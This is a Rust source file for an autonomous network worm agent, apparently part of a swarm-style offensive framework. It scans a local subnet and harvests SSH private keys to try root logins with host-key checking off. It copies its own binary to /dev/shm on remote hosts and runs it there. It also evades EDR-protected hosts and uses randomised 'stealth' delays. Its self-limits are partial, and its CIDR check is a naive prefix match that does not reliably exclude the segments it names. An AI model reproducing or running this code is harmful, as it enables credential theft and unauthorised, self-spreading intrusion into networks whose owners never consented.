use hive_base::{AgentIdentity, HiveChamber, Message, Payload, Role, Value};
use hive_base::ml::RandomForest;
use rand::Rng;
use std::env;
use std::time::Duration;
use tracing::{info, warn};

// ── Auto-limitation config ───────────────────────────────────────────────────

struct WormLimits {
    max_hops: u32,              // Maximum propagation hops before self-termination
    forbidden_segments: Vec<String>, // Network segments to NEVER touch
    stealth_delay: Duration,    // Base delay between infection attempts
    max_infections_per_minute: u32, // Rate limiter
    self_destruct_after: Duration,  // Auto-terminate after this long
    avoid_edr_threshold: f32,   // Skip targets with EDR confidence above this
}

impl Default for WormLimits {
    fn default() -> Self {
        Self {
            max_hops: 10,
            forbidden_segments: vec![
                "10.0.0.0/8".into(),    // Private infra
                "172.16.0.0/12".into(),  // Private infra
                "192.168.100.0/24".into(), // Management
            ],
            stealth_delay: Duration::from_secs(30),
            max_infections_per_minute: 2,
            self_destruct_after: Duration::from_secs(3600), // 1 hour
            avoid_edr_threshold: 0.7,
        }
    }
}

// ── Infection state ──────────────────────────────────────────────────────────

struct InfectionState {
    host: String,
    success: bool,
    timestamp: u64,
    method: String,
    edr_detected: bool,
}

// ── Worm Agent ───────────────────────────────────────────────────────────────

struct WormAgent {
    comms: HiveChamber,
    identity: AgentIdentity,
    limits: WormLimits,
    hops: u32,
    infections: Vec<InfectionState>,
    birth_time: std::time::Instant,
    infections_this_minute: u32,
    minute_start: std::time::Instant,
    known_hosts: Vec<String>,
    marl_state: Vec<f32>,  // RL state for hop decisions
}

impl WormAgent {
    async fn new() -> Self {
        let identity = AgentIdentity::new();
        let comms = HiveChamber::connect(&identity, Role::Worker)
            .await
            .expect("Worm: failed to connect to colmena arena");

        let limits = WormLimits::default();

        info!("Worm agent active | ID: {} | Max hops: {} | Lifetime: {}m",
            identity.id(), limits.max_hops, limits.self_destruct_after.as_secs() / 60);

        Self {
            comms, identity, limits,
            hops: 0,
            infections: Vec::new(),
            birth_time: std::time::Instant::now(),
            infections_this_minute: 0,
            minute_start: std::time::Instant::now(),
            known_hosts: Vec::new(),
            marl_state: vec![0.0; 62],
        }
    }

    // ── Autonomous propagation (no consensus required) ────────────────────

    async fn discover_targets(&mut self) -> Vec<String> {
        // Read beliefs from scouts (EDR status, network layout)
        let messages = self.comms.read_new().await;
        let mut edr_hosts = Vec::new();
        let mut clean_hosts = Vec::new();

        for msg in messages {
            if let Payload::Belief { asset, value, .. } = &msg.payload {
                match asset.as_str() {
                    "edr_present" => {
                        if let Value::Bool(true) = value {
                            edr_hosts.push(msg.agent_id.to_string());
                            info!("Worm: EDR detected on {}", msg.agent_id);
                        }
                    }
                    "hostname" => {
                        if let Value::String(h) = value {
                            if !self.is_already_infected(h) {
                                clean_hosts.push(h.clone());
                            }
                        }
                    }
                    "network_interfaces" => {
                        // Discover new subnets from network info
                        info!("Worm: network info from scout");
                    }
                    _ => {}
                }
            }
        }

        // Active network discovery (nmap/ARP)
        let discovered = hive_base::discover_hosts("192.168.1.0/24");
        for host in discovered {
            if !self.is_already_infected(&host) && !self.in_forbidden_segment(&host) {
                clean_hosts.push(host);
            }
        }

        // MARL: prioritize targets using learned policy
        self.marl_prioritize_targets(&mut clean_hosts);

        clean_hosts
    }

    fn marl_prioritize_targets(&self, hosts: &mut Vec<String>) {
        // Build state vector for each target and rank by expected Q-value
        let model_bytes = include_bytes!("../../worker/models/scout_classifier.bin").to_vec();

        if model_bytes.is_empty() { return; }

        if let Some(model) = RandomForest::from_binary(&model_bytes) {
            for host in hosts.iter() {
                let state = self.build_target_state(host);
                if let Some(q_value) = model.predict(&state) {
                    info!("Worm MARL: {} Q-value: {}", host, q_value);
                }
            }
        }
    }

    fn build_target_state(&self, _host: &str) -> Vec<f32> {
        let mut state = vec![0.0f32; 62];
        state[0] = 1.0; // has_agent (we are here)
        state[1] = 0.1; // low EDR (we checked)
        state[2] = 0.0; // not backup
        state[3] = 0.33; // segment
        state[4] = 0.5; // value
        state[5] = 0.0; // not yet compromised
        state[60] = 0.0; // detection low
        state[61] = 0.0; // no alerts
        state
    }

    // ── Infection methods ─────────────────────────────────────────────────

    async fn infect_host(&mut self, host: &str) -> InfectionState {
        let mut rng = rand::thread_rng();
        let method = match rng.gen_range(0..3) {
            0 => "ssh_key",
            1 => "ssh_default_creds",
            _ => "scp_deploy",
        };

        info!("Worm: infecting {} via {}", host, method);

        // Real SSH infection attempt
        let result = match method {
            "ssh_key" => {
                // Try harvested keys
                let keys = hive_base::harvest_credentials();
                let ssh_keys: Vec<_> = keys.iter()
                    .filter(|(n, _, _)| n.ends_with("_rsa") || n.ends_with("_ed25519"))
                    .collect();

                let mut success = false;
                for (_key_name, key_data, _) in &ssh_keys {
                    if let Ok(_) = std::fs::write("/tmp/.wk", key_data) {
                        let output = std::process::Command::new("ssh")
                            .args(["-o", "StrictHostKeyChecking=no",
                                   "-o", "ConnectTimeout=5",
                                   "-o", "BatchMode=yes",
                                   "-i", "/tmp/.wk",
                                   &format!("root@{}", host),
                                   "id"])
                            .output();
                        let _ = std::fs::remove_file("/tmp/.wk");
                        if let Ok(out) = output {
                            if out.status.success() {
                                success = true;
                                break;
                            }
                        }
                    }
                }
                success
            }
            "scp_deploy" => {
                // Deploy via SCP + SSH exec
                let current_bin = env::current_exe().unwrap_or_else(|_| "/proc/self/exe".into());
                let binary = std::fs::read(&current_bin).unwrap_or_default();
                if !binary.is_empty() {
                    let result = hive_base::exec_ssh(host, "root",
                        &format!("cat > /dev/shm/.w && chmod +x /dev/shm/.w && /dev/shm/.w &"),
                        None, None);
                    result.success
                } else {
                    false
                }
            }
            _ => false,
        };

        let ts = hive_base::utils::timestamp_now();
        let state = InfectionState {
            host: host.to_string(),
            success: result,
            timestamp: ts,
            method: method.to_string(),
            edr_detected: false,
        };

        if result {
            info!("Worm: SUCCESS - infected {}", host);
            self.hops += 1;
        } else {
            info!("Worm: FAILED - could not infect {}", host);
        }

        state
    }

    // ── Safety checks ────────────────────────────────────────────────────

    fn is_already_infected(&self, host: &str) -> bool {
        self.infections.iter().any(|i| i.host == host && i.success)
    }

    fn in_forbidden_segment(&self, host: &str) -> bool {
        // BRAIN: check safe IPs first
        let cfg = hive_base::config::HiveConfig::load();
        if hive_base::panal::is_safe_target(host, &cfg.brain) {
            return true; // treat safe hosts as forbidden
        }
        for segment in &self.limits.forbidden_segments {
            if host_in_cidr(host, segment) {
                warn!("Worm: {} in forbidden segment {}", host, segment);
                return true;
            }
        }
        false
    }

    fn should_self_destruct(&self) -> bool {
        self.birth_time.elapsed() >= self.limits.self_destruct_after
            || self.hops >= self.limits.max_hops
    }

    fn rate_limit_ok(&mut self) -> bool {
        if self.minute_start.elapsed() >= Duration::from_secs(60) {
            self.infections_this_minute = 0;
            self.minute_start = std::time::Instant::now();
        }
        self.infections_this_minute < self.limits.max_infections_per_minute
    }

    // ── Main worm loop ───────────────────────────────────────────────────

    async fn run(&mut self) {
        info!("Worm: autonomous propagation started (no consensus required)");
        self.comms.send_heartbeat().await;

        loop {
            // Check limits
            if self.should_self_destruct() {
                let reason = if self.hops >= self.limits.max_hops {
                    "max hops reached"
                } else {
                    "lifetime expired"
                };
                info!("Worm: self-destruct ({}) | {} hops, {} infections",
                    reason, self.hops,
                    self.infections.iter().filter(|i| i.success).count());

                // Notify swarm before dying
                let msg = Message::status_event(
                    self.identity.id(), Role::Worker,
                    "worm_terminate", self.identity.id(), Role::Worker,
                    reason,
                );
                self.comms.publish(msg).await;
                break;
            }

            if !self.rate_limit_ok() {
                info!("Worm: rate limit - waiting...");
                tokio::time::sleep(Duration::from_secs(10)).await;
                continue;
            }

            // Discover targets (reads scout beliefs + active scan)
            let targets = self.discover_targets().await;
            if targets.is_empty() {
                info!("Worm: no new targets, waiting...");
                tokio::time::sleep(self.limits.stealth_delay).await;
                continue;
            }

            // Infect opportunistic targets
            for host in &targets[..targets.len().min(3)] {
                if self.should_self_destruct() { break; }
                if !self.rate_limit_ok() { break; }

                let state = self.infect_host(host).await;
                self.infections.push(state);
                self.infections_this_minute += 1;

                // Random delay between infections (stealth)
                let delay = rand::thread_rng().gen_range(5..=self.limits.stealth_delay.as_secs());
                tokio::time::sleep(Duration::from_secs(delay)).await;
            }

            // Send heartbeat
            self.comms.send_heartbeat().await;
        }

        info!("Worm terminated after {} hops", self.hops);
    }
}

// ── CIDR check helper ────────────────────────────────────────────────────────

fn host_in_cidr(host: &str, cidr: &str) -> bool {
    let cidr_parts: Vec<&str> = cidr.split('/').collect();
    if cidr_parts.len() == 2 {
        let prefix = cidr_parts[0];
        host.starts_with(&prefix[..prefix.len().min(host.len())])
    } else {
        false
    }
}

// ── Main ─────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() {
    hive_base::utils::init_logging("swarm");
    info!("Initializing Swarm-Worm (autonomous, no consensus)...");
    let mut worm = WormAgent::new().await;
    worm.run().await;
}
